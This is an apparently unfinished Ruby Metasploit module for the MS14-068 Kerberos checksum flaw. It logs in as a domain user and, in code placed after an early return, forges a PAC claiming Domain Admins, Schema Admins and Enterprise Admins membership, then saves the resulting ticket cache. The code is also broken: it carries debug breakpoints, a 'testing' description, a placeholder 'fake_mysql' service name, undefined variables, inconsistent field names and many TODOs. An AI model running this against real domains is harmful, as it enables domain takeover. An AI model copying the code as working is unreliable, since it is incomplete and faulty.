##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'time'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
        'Description' => %q{
          testing
        },
        'Author' => [
          'Alberto Solino', # impacket example
          'Jacob Robles',    # Python Metasploit module conversion
          'alanfoster'      # Ruby Metasploit module conversion
        ],
        'References' => [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'https://github.com/bidord/pykek'],
          ['URL', 'https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2014-11-18'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The Domain User' ]),
        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        # OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ]
    )
  end

  # Sends the required kerberos AS requests for a kerberos Ticket Granting Ticket
  #
  # @param opts [Hash]
  # @return [Rex::Proto::Kerberos::Model::KdcResponse]
  # @see Msf::Kerberos::Client::TgsRequest#build_tgs_request
  # @see Rex::Proto::Kerberos::Model::KdcResponse
  def get_kerberos_tgt(options = {})
    realm = options[:realm]
    server_name = options[:server_name]
    client_name = options[:client_name]
    password = options[:password]
    request_pac = options.fetch(:request_pac, true)

    # TODO: Properly negotiate encryption with the server with graceful fallbacks etc
    desired_encryption_type = Rex::Proto::Kerberos::Crypto::RC4_HMAC

    unicode_password = Rex::Text.to_unicode(password)
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    # First stage: Initial AS-REQ request, used to exchange supported encryption methods.
    # The server may respond with a ticket granting ticket (TGT) immediately,
    # or the client will second AS-REQ is required

    print_status("#{peer} - Sending First AS-REQ...")
    now = Time.now.utc
    expiry_time = now + 1.day
    initial_as_req = build_as_request(
      pa_data: [
        build_pa_pac_request(pac_request_value: request_pac)
      ],
      body: build_as_request_body(
        client_name: client_name,
        server_name: server_name,
        realm: realm,

        etype: [desired_encryption_type],

        # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
        from: nil,
        til: expiry_time,
        rtime: expiry_time
      )
    )

    initial_as_res = send_request_as(req: initial_as_req)

    # Verify the server supports the required encryption
    encryption_type_unsupported = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_ETYPE_NOSUPP
    )
    if encryption_type_unsupported
      raise Rex::Proto::Kerberos::Model::Error::KerberosEncryptionNotSupported
    end

    is_preauth_required = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
    )

    # Determine if preauthentication is required, or if the server has responded with a ticket granting ticket
    if !is_preauth_required
      # If preauth is not required, then the ticket granting ticket was already in the asrep response
      print_status("#{peer} - Preauthentication not required...")
      print_good("TODO: Log ticket for later offline cracking")
      # print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
      initial_as_res.ticket
      as_rep_result = initial_as_res
    else
      print_status("#{peer} - Preauthentication required...")
      preauth_as_req = build_as_request(
        pa_data: [
          build_as_pa_time_stamp(key: password_digest, etype: desired_encryption_type),
          build_pa_pac_request(pac_request_value: request_pac)
        ],
        body: build_as_request_body(
          client_name: client_name,
          server_name: server_name,
          realm: realm,
          key: password_digest,

          etype: [desired_encryption_type],

          # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
          from: nil,
          till: expiry_time,
          rtime: expiry_time
        )
      )

      preauth_as_res = send_request_as(req: preauth_as_req)
      as_rep_result = preauth_as_res
    end


    if as_rep_result.msg_type != Rex::Proto::Kerberos::Model::AS_REP
      vprint_status("Kerberos ticket granting ticket created successfully")
      raise "todo"
    end


    {
      ticket: as_rep_result.ticket,
      auth: extract_enc_kdc_response(as_rep_result, password_digest),
      enc_part: as_rep_result.enc_part
    }
  end

  def run
    print_status('Validating options...')

    domain = datastore['DOMAIN'].upcase
    print_status("Using domain #{domain}...")

    server_name = "krbtgt/#{domain}"
    client_name = datastore['USERNAME'].to_s

    # TODO: Decide if this should be asrep or just tgt, or something else
    tgt_result = get_kerberos_tgt(
      server_name: server_name,
      client_name: client_name,
      password: datastore['PASSWORD'],
      realm: domain,
    )

    # require 'pry'; binding.pry

    # TODO: Tomorrow's problems:
    #   - Find out what enc_part is for, do we need to pass it as part of the tgs?


    now = Time.now.utc
    expiry_time = now + 1.day

    require 'pry'; binding.pry
    #
    # pac = build_pac(
    #   client_name: client_name,
    #   # group_ids: groups,
    #   # domain_id: domain_sid,
    #   # user_id: user_rid,
    #   realm: domain,
    #   # logon_time: logon_time,
    #   checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
    # )
    #
    # auth_data = build_pac_authorization_data(pac: pac)


    tgs_res = send_request_tgs(
      # TODO: client_name isn't required as part of the tgs body, it's part of the authenticator data though. TODO: Find the difference between cname and client_name
      client_name: client_name,
      cname: client_name,
      # TODO:
      server_name: 'adf3.local\fake_mysql',  # "krbtgt/#{domain}",
      realm: domain,
      ticket: tgt_result[:ticket],

      # TODO: Find the difference between session_key and subkey
      # From: lib/msf/core/exploit/remote/kerberos/client/tgs_request.rb:134 Msf::Exploit::Remote::Kerberos::Client::TgsRequest#build_ap_req:
      # session_key: tgt_result[:auth].key,
      subkey: tgt_result[:auth].key,

      # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
      from: nil,
      till: expiry_time,
      rtime: expiry_time,

      # certificate time
      ctime: now,

      # TODO: Confirm if we can pass around the decrypted and encrypted together for debugging
      #             auth_data: tgt_result[:auth],
      #             TODO: Confirm sub_key is session_key
      #
      # Do we need to generate this still?
      # pa_data: [
      #   build_pa_pac_request
      # ],
      # subkey: sub_key
    )



    return

    # auth = []
    # auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
    # auth << build_pa_pac_request
    # auth
    #
    # print_status("#{peer} - Sending AS-REQ...")
    # res = send_request_as(
    #   client_name: client_name,
    #   server_name: server_name,
    #   realm: domain.to_s,
    #   key: password_digest,
    #   pa_data: pre_auth
    # )
    #
    # unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
    #   print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
    #   print_error("#{peer} - Invalid AS-REP, aborting...")
    #   return
    # end
    #
    # print_status("#{peer} - Parsing AS-REP...")
    #
    # session_key = extract_session_key(res, password_digest)
    # logon_time = extract_logon_time(res, password_digest)
    # ticket = res.ticket

    pre_auth = []
    pre_auth << build_pa_pac_request

    groups = [
      513, # DOMAIN_USERS
      512, # DOMAIN_ADMINS
      520, # GROUP_POLICY_CREATOR_OWNERS
      518, # SCHEMA_ADMINISTRATORS
      519  # ENTERPRISE_ADMINS
    ]

    # user_sid_arr = datastore['USER_SID'].split('-')
    # domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
    # user_rid = user_sid_arr[user_sid_arr.length - 1].to_i

    pac = build_pac(
      client_name: client_name,
      group_ids: groups,
      domain_id: domain_sid,
      user_id: user_rid,
      realm: domain,
      logon_time: logon_time,
      checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
    )

    auth_data = build_pac_authorization_data(pac: pac)
    sub_key = build_subkey(subkey_type: Rex::Proto::Kerberos::Crypto::RC4_HMAC)

    print_status("#{peer} - Sending TGS-REQ...")

    res = send_request_tgs(
      client_name: client_name,
      server_name: server_name,
      realm: domain,
      session_key: session_key,
      ticket: ticket,
      auth_data: auth_data,
      pa_data: pre_auth,
      subkey: sub_key
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{peer} - Invalid TGS-REP, aborting...")
      return
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")

    cache = extract_kerb_creds(res, sub_key.value)

    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    print_good("#{peer} - MIT Credential Cache saved on #{path}")
  end

  def warn_error(res)
    res.error_code.to_s
  end
end
